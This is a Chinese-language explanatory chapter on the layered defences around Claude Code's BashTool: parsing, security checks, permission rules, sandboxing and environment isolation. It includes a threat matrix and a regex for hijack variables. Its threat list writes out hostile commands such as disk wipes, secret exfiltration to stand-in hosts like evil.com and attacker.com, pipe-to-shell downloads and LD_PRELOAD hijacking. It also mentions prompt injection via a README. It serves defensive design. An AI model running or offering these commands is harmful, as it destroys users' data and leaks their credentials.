# 00 总览与代码地图

## 0.1 为什么 BashTool 是 agent 工程里最危险的工具

LLM 跑 shell 这件事的风险等级，比 LLM 读文件 / LLM 写文件高得多：

| 工具 | 失守后果 | 可逆性 |
|------|---------|--------|
| FileRead | 模型读到了不该读的文件 | 完全可逆（已经读了就读了，没改东西） |
| FileEdit | 文件被改了 | 部分可逆（有 transcript，能 diff 回去） |
| WebFetch | 访问了某个 URL | 完全可逆（请求级别，没改本地） |
| **BashTool** | **任意 OS 操作**：删文件、读密钥、改系统配置、网络外联、写 crontab、改 dotfiles ... | **极差**：很多操作不可逆 |

具体威胁：

- **直接破坏**：`rm -rf /` / `dd if=/dev/zero of=/dev/sda` / `mkfs.ext4` ...
- **数据泄露**：`cat ~/.ssh/id_rsa | curl evil.com` / `find / -name '*.env' | xargs cat | base64 | nc attacker.com 80`
- **持久化后门**：写 `.bashrc` 添加恶意 alias / 创建 cron / launchd plist / SSH authorized_keys
- **凭据劫持**：`LD_PRELOAD=/tmp/evil.so npm install` / `PATH=/tmp:$PATH brew install ...`
- **网络外联**：`curl evil.com/payload | sh` / `nc -lvnp 4444`
- **加密货币挖矿**：`wget xxx && ./xxx` / `docker run cpuminer ...`
- **横向移动**：`ssh user@another-host '...'` / `kubectl exec ...`

更糟糕的是这些攻击的**触发门槛极低**——一个被注入的 README 文件就能诱导模型生成上面任何一条。

所以 BashTool 必须按**安全敏感系统**的标准来设计——多层独立防御、最小权限、纵深隔离、行为可观察。

## 0.2 5 道闸门的防御管线

Claude Code 把"模型决定调 BashTool"到"系统真正 spawn 一个进程"之间，加了 5 道独立闸门：

```

                    input: { command: 'rm -rf /', ... } }

        │ - IFS injection 检测                │
        │ - malformed token 检测              │
        │ - 复合命令逐段检查                  │
```

## 0.4 与 PowerShellTool 的平行关系

Windows 上 BashTool 不可用，Claude Code 提供了平行的 `PowerShellTool/`：

```
tools/PowerShellTool/

├── gitSafety.ts                   (git 安全 wrapper)
├── commonParameters.ts
├── modeValidation.ts
├── destructiveCommandWarning.ts
├── commandSemantics.ts
└── prompt.ts
```

设计上和 BashTool 一一对应，区别：

- PowerShell 用 **Constrained Language Mode (CLM)** 而不是 sandbox-exec；
- PowerShell 有专门的 `gitSafety.ts` 处理 PowerShell 调 git 时的引号问题；
- 解析层不需要 tree-sitter——PowerShell 本身提供 AST。

本专题主要展开 BashTool。PowerShellTool 的对应实现在 09 里会简要对比。

## 0.5 威胁模型矩阵

把 0.1 列的威胁映射到 5 道闸门，看哪一层主防：

| 威胁形态 | 闸门 1 解析 | 闸门 2 security | 闸门 3 permission | 闸门 4 sandbox | 闸门 5 隔离 |
|---------|:----:|:----:|:----:|:----:|:----:|
| 直接破坏（`rm -rf /`） | — | ★ malformed/dangerous | ★ rm 规则 | ★ 路径写保护 | — |
| 数据泄露（`cat ~/.ssh/...`） | — | — | ★ cat 路径校验 | ★ 路径读保护 | — |
| 后门持久化（写 .bashrc） | — | — | ★ 路径校验 | ★ 路径写保护 | — |
| 凭据劫持（`LD_PRELOAD=`） | ★ env var 识别 | — | ★ `BINARY_HIJACK_VARS` | — | ★ subprocessEnv 隔离 |
| 网络外联（`curl evil.com`） | — | — | ★ curl/wget 规则 | ★ 网络限制 | — |
| 注入闭合（`a; rm -rf /`） | ★ AST 拆分 | ★ 逐段检查 | ★ 逐段决策 | — | — |
| IFS injection | — | ★ IFS 检测 | — | — | — |
| Unicode 隐写攻击 | — | — | — | — | — （由 [prompt-injection 03](../prompt-injection/03-Unicode清洗管线.md) 入口拦截） |
| 命令链规避（`ti``meout`） | ★ 解析展开 | ★ 字面识别 | ★ stripSafeWrappers | — | — |
| `sed -i` 不可逆改文件 | — | — | — | — | — （特殊路径：见 [06](./06-sed与wrapper-specs.md)，sed 不直接执行而是模拟） |

可以看到：
- 没有任何一种威胁靠**单一**闸门防御；
- permission 决策（闸门 3）是覆盖最广的——它对接其它所有闸门的判定结果；
- sandbox（闸门 4）是最后的"行为面收紧"——即使前面都漏过，沙箱仍限制能做什么。

## 0.6 几个隐性设计判断

读这套代码之前，先建立几个判断，后面读细节会更顺：

### 1. 不信任 regex，全部走 AST

bash 是出了名的难解析的语言（`$IFS` / heredoc / process substitution / brace expansion / glob / 嵌套引号 ...）。Claude Code 用 **tree-sitter-bash WASM** 把整个命令解析成 AST，然后在 AST 上做检查——这避免了一整类"regex 看起来安全但实际不安全"的攻击。

例：`IFS=$'\n'`. regex 看不出问题，但 AST 上 `IFS=` 是一个独特的环境变量赋值节点，可以精确识别。

### 2. 复合命令永远逐段检查

`cmd1 && cmd2 && cmd3` / `cmd1 | cmd2` / `cmd1; cmd2` —— 任何一段都可能危险。所以 `splitCommand_DEPRECATED` / `splitCommandWithOperators` 把复合命令拆开，**每一段独立走完整决策链**。

这是为什么 `MAX_SUBCOMMANDS_FOR_SECURITY_CHECK = 50`——如果一个命令包含超过 50 段（攻击者刻意构造的指数爆炸），直接拒绝。

### 3. 看穿 wrapper

`timeout 30 bazel run //...` 表面上是在跑 `timeout`，实际上跑的是 `bazel`。如果权限规则配的是 `Bash(bazel run:*)`，应该匹配。

`utils/bash/specs/` 下的 7 个 spec 文件就是定义这些 wrapper 的"透视"方式——`stripSafeWrappers` 会迭代地剥掉 `timeout`/`sleep`/`nohup`/`alias`/`time`/`pyright`/`srun` 直到拿到真正的命令。

注意这是**双向的**：既要让权限规则按真命令匹配，又要让 sandbox 决策按真命令做。

### 4. 环境变量是攻击向量

```ts
// bashPermissions.ts:704
export const BINARY_HIJACK_VARS = /^(LD_|DYLD_|PATH$)/
```

这个 regex 监控 3 类环境变量：
- `LD_*`（Linux 动态链接器变量，如 `LD_PRELOAD`、`LD_LIBRARY_PATH`）
- `DYLD_*`（macOS 动态链接器变量，如 `DYLD_INSERT_LIBRARIES`）
- `PATH`（覆盖 PATH 让某个命令解析到攻击者的二进制）

命令前面带这种变量赋值会触发额外检查——你不能用 `LD_PRELOAD=/tmp/evil.so npm install` 来劫持 `npm` 的执行。

### 5. sed 不真执行

`sed -i` 是"in-place 编辑"——直接改文件、不可逆、不留 diff。Claude Code 不让模型直接跑 sed -i——它的 `sedEditParser.ts` 会**解析 sed 表达式**，模拟出等价的 FileEdit 操作，让用户在 FileEdit 的常规 diff UI 里审查。

这是一个**用工具替代实现**的优雅设计——既保留功能，又获得审计能力。

### 6. 沙箱是行为面收紧而不是命令级拦截

sandbox-exec 在 Darwin 上创建一个 sandbox profile，限制**进程能访问的文件路径、网络端口、socket 类型**。它不在乎你跑什么命令——你跑 `cat` 还是 `rm`，沙箱都只让你访问允许的路径。

这意味着即使 permission 决策错误地放过了 `rm -rf ~`，沙箱仍然能阻止它真正破坏文件——因为 `~` 不在 sandbox profile 的写允许列表里。

### 7. PowerShell 不需要 sandbox-exec，因为有 CLM

Windows 的 sandbox 故事不一样——PowerShell 提供 **Constrained Language Mode (CLM)**，在语言层面限制 .NET 调用、COM、文件系统访问等。Claude Code 用 CLM 而不是 OS 级沙箱。
